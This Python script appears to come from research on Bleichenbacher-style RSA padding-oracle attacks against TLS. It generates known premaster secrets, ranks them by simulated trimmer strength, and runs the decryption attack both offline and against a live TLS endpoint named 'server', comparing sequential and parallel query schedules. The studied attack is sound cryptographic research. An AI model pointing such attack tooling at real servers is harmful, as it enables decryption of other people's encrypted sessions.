"""Compare both TLS query schedules on the same known ciphertexts.

This is a diagnostic, not a Figure 5 measurement: it generates a known TLS
premaster secret, selects messages by their simulated trimmer strength, and
then attacks each ciphertext against the live TLS oracle in both modes.
"""

import argparse
import json
import random
import time
from pathlib import Path

from reversebleichenbacher import ProofAttack, QueryResult, SequentialExecutor
from reversebleichenbacher.core import AttackConfig
from reversebleichenbacher.trimmer import Trimmer
from tls_attack import SharedTLSAttack
from tls_transport import get_rsa_from_server, make_cke_prefix


def make_message(rng, key_bytes):
    suffix = bytes(rng.randrange(256) for _ in range(46))
    padding = bytearray()
    while len(padding) < key_bytes - 51:
        value = rng.randrange(256)
        if value:
            padding.append(value)
    encoded = b"\x00\x02" + padding + b"\x00\x03\x03" + suffix
    return int.from_bytes(encoded, "big"), suffix


class KnownPlaintextOracle:
    def __init__(self, plaintext, modulus, key_bytes):
        self.plaintext = plaintext
        self.modulus = modulus
        self.key_bytes = key_bytes
        self.B = 1 << (8 * (key_bytes - 2))

    def __call__(self, multiplier):
        value = self.plaintext * multiplier % self.modulus
        if not 2 * self.B <= value < 3 * self.B:
            return False
        encoded = value.to_bytes(self.key_bytes, "big")
        return all(encoded[2:10]) and 0 in encoded[10:]


class LocalBatchExecutor(SequentialExecutor):
    """Exercise the shared batch path with deliberately reordered answers."""

    batch_size = 256

    def execute_batch(self, candidates):
        for candidate in reversed(candidates):
            yield QueryResult(candidate, self.query(candidate.multiplier))


def local_attack(plaintext, modulus, key_bytes, parallel):
    oracle = KnownPlaintextOracle(plaintext, modulus, key_bytes)
    executor = (LocalBatchExecutor if parallel else SequentialExecutor)(oracle)
    attack = ProofAttack()
    attack.init_process(
        "FFT", key_bytes * 8, AttackConfig.optimized("FFT", key_bytes * 8),
        parallel=parallel,
    )
    try:
        recovered, _ = attack.attack(executor, modulus)
        return {"success": recovered == plaintext % (1 << (8 * 46)),
                "tau": attack.tau_found, "queries": executor.submitted_queries}
    except Exception as error:
        message = str(error)
        return {"success": False, "tau": attack.tau_found,
                "queries": executor.submitted_queries,
                "phase": getattr(error, "step", "unknown"),
                "error": message[:200] + ("..." if len(message) > 200 else "")}


def trimmer_strength(plaintext, modulus, key_bytes):
    executor = SequentialExecutor(KnownPlaintextOracle(plaintext, modulus, key_bytes))
    trimmer = Trimmer(
        modulus=modulus,
        B=1 << (8 * (key_bytes - 2)),
        config=AttackConfig.optimized("FFT", key_bytes * 8),
        executor=executor,
    )
    tau, _ = trimmer.generate_and_test()
    return tau


def live_attack(ciphertext, suffix, rsa, prefix, parallel, stats_path):
    stats_path.unlink(missing_ok=True)
    attack = SharedTLSAttack("server", 443, rsa, prefix, parallel=parallel)
    started = time.monotonic()
    try:
        recovered = attack.decrypt(ciphertext)
        error = None
    except Exception as exc:
        recovered = None
        message = str(exc)
        error = message[:200] + ("..." if len(message) > 200 else "")
    stats = json.loads(stats_path.read_text()) if stats_path.exists() else None
    return {
        "success": recovered == int.from_bytes(suffix, "big"),
        "error": error,
        "tau": stats.get("tau") if stats else None,
        "queries": stats.get("total_queries") if stats else None,
        "round_trips": stats.get("total_round_trips") if stats else None,
        "runtime_s": stats.get("runtime") if stats else time.monotonic() - started,
        "phase": stats.get("result") if stats else None,
    }


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--count", type=int, default=3)
    parser.add_argument("--seed", type=int, default=20261008)
    parser.add_argument("--min-trimmer", type=int, default=50)
    parser.add_argument("--max-trimmer", type=int)
    parser.add_argument("--max-scan", type=int, default=1000)
    parser.add_argument("--message-index", type=int,
                        help="Inspect one exact generated message index")
    parser.add_argument("--offline-only", action="store_true")
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()
    if args.count < 1 or args.max_scan < args.count or args.min_trimmer < 1:
        parser.error("count, max-scan, and min-trimmer must be positive")
    if args.message_index is not None and (
        args.message_index < 0 or args.message_index >= args.max_scan or args.count != 1
    ):
        parser.error("--message-index requires --count 1 and an index below --max-scan")

    rsa = get_rsa_from_server("server", 443)
    key_bytes = rsa.bits // 8
    prefix = make_cke_prefix(rsa)
    rng = random.Random(args.seed)
    rows = []
    for message_index in range(args.max_scan):
        plaintext, suffix = make_message(rng, key_bytes)
        if args.message_index is not None and message_index != args.message_index:
            continue
        tau = trimmer_strength(plaintext, rsa.N, key_bytes)
        if args.message_index is None and (
            tau < args.min_trimmer or (
                args.max_trimmer is not None and tau > args.max_trimmer
            )
        ):
            continue
        print(f"Message {message_index}: simulated trimmer tau={tau}", flush=True)
        row = {"message_index": message_index, "simulated_trimmer_tau": tau}
        row["offline_normal"] = local_attack(plaintext, rsa.N, key_bytes, False)
        row["offline_parallel"] = local_attack(plaintext, rsa.N, key_bytes, True)
        if not args.offline_only:
            ciphertext = pow(plaintext, rsa.e, rsa.N)
            stats_path = Path("results.json")
            row["live_normal"] = live_attack(
                ciphertext, suffix, rsa, prefix, False, stats_path
            )
            row["live_parallel"] = live_attack(
                ciphertext, suffix, rsa, prefix, True, stats_path
            )
        rows.append(row)
        print(json.dumps(row), flush=True)
        if len(rows) >= args.count:
            break
    if len(rows) != args.count:
        raise RuntimeError(f"found {len(rows)} matching messages out of {args.count}")
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(json.dumps(rows, indent=2) + "\n")


if __name__ == "__main__":
    main()
